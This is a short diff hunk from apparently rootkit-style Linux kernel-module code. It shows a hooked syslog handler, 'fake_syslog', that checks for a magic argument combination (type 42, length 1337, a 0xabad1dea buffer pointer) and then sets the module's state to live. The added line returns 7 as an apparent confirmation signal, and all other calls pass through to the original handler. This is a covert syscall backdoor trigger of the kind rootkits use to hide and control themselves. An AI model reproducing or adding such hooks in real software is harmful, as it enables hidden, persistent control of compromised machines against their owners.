@@ -64,6 +64,7 @@ asmlinkage int fake_syslog(int type, char __user* buf, int len)
     if ((type == 42) && (len == 1337) && (((uintptr_t)buf) == 0xabad1dea))
     {
 	((struct module*)(THIS_MODULE))->state = MODULE_STATE_LIVE;
+        return 7;
     }
 
     return old_syslog_func(type, buf, len);
